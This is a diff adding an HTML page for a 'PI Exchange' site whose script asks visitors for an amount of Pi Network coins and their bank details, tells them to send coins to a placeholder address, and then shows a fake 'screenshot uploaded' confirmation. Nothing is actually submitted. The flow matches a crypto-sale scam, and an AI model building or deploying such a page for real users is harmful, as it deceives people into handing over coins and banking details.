@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PI Exchange</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #F7D100; /* Yellow color */
+            color: #333;
+        }
+        header {
+            background-color: #F7D100;
+            color: white;
+            padding: 1rem 0;
+            text-align: center;
+        }
+        main {
+            padding: 2rem;
+            text-align: center;
+        }
+        footer {
+            background-color: #fff;
+            color: #333;
+            text-align: center;
+            padding: 1rem 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+        button {
+            background-color: #003366; /* Dark blue color */
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: #002244;
+        }
+        .logo {
+            width: 40px;
+            height: 40px;
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Welcome to PI Exchange</h1>
+        <p>Your trusted platform for exchanging PI Network</p>
+    </header>
+
+    <main>
+        <h2>What is PI Exchange?</h2>
+        <p>PI Exchange allows you to sell or exchange your PI Network coins securely.</p>
+        <button onclick="startSelling()">Sell Your PI</button>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 PI Exchange. All rights reserved.</p>
+        <img src="https://static.vecteezy.com/system/resources/previews/013/257/205/non_2x/pi-icon-pi-network-pi-logo-cryptocurrency-symbol-modern-simple-the-icon-for-website-design-mobile-app-ui-free-vector.jpg" alt="PI Logo" class="logo">
+    </footer>
+
+    <script>
+        function startSelling() {
+            let amount = prompt("How much PI would you like to sell? (Enter a number between 0-5000)");
+
+            if (amount >= 0 && amount <= 5000) {
+                let instructions = confirm(`You are selling ${amount} PI. Do you want to proceed?`);
+                if (instructions) {
+                    let bankDetails = prompt("Please enter your bank account details:\nBank Name: \nAccount No: \nTitle: ");
+                    if (bankDetails) {
+                        let sendPi = confirm(`Please send ${amount} PI to the following address: \n\nAddress: Abcedlalhajak (Public PI Address)`);
+                        if (sendPi) {
+                            let uploadScreenshot = confirm("Upload your screenshot of the PI transaction to confirm.");
+                            if (uploadScreenshot) {
+                                alert("Screenshot uploaded successfully. Please wait for 30 minutes to process your payment.");
+                            }
+                        }
+                    }
+                }
+            } else {
+                alert("Please enter a valid number between 0 and 5000.");
+            }
+        }
+    </script>
+</body>
+</html>￼Enter
